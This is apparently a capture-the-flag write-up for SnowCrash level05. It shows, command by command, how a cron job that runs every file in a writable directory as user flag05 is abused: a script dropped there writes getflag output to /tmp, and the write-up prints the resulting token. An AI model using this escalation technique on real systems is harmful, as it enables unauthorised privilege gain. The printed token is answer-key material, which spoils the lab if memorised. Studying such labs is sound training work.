We use "ls -l" in our home directory to check if there is any binary.

level05@SnowCrash:~$ ls -l
total 0

Well we found nothing, so we use the find command to see if we find something.

level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

Aha! We are successful this time, now we check what's in this path.

level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

By analyzing the script we understand that it execute all executables in "/opt/openarenaserver/*" (bash -x "$I") -x only shows the command executed in the terminal.

Also by doing an ls -l on the path we see this script runs with flag05 privileges:
[......]
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
[......]

Now we need to find out where this script is triggered.

So we just did a big search to find anything related with the script and the level05 simultaneously

find / openarenaserver 2>/dev/null | grep "level05"
/etc/apache2/sites-available/level05.conf
/etc/apache2/sites-enabled/level05.conf
/var/mail/level05
/rofs/etc/apache2/sites-available/level05.conf
/rofs/etc/apache2/sites-enabled/level05.conf
/rofs/var/mail/level05

As we can see, we found the there is a mail with the name of level05, we check it.

level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

Aha! We find that there is cron job that is done every 2 minutes that executes the script as flag05.

Now the exploit is Simple, we create a script that executes getflag command in /tmp where we can give it executable rules then move it to (/opt/openarenaserver/) and that script also send getflag output into a file also located in /tmp.


level05@SnowCrash:~$ vi /tmp/exploit.sh

#!/bin/bash

/bin/getflag > /tmp/flag.txt


level05@SnowCrash:~$ chmod 777 /tmp/exploit.sh

level05@SnowCrash:~$ mv /tmp/exploit.sh /opt/openarenaserver/.

level05@SnowCrash:~$ cd /opt/openarenaserver
level05@SnowCrash:/opt/openarenaserver$ ls -l
total 4
-rwxrwxrwx 1 level05 level05 42 Aug 20 03:40 exploit.sh

Then we just wait 2 mins...

We re check and see that the file is gone :

level05@SnowCrash:/opt/openarenaserver$ ls -l
total 0

So now we just cat where we sent the output.

level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
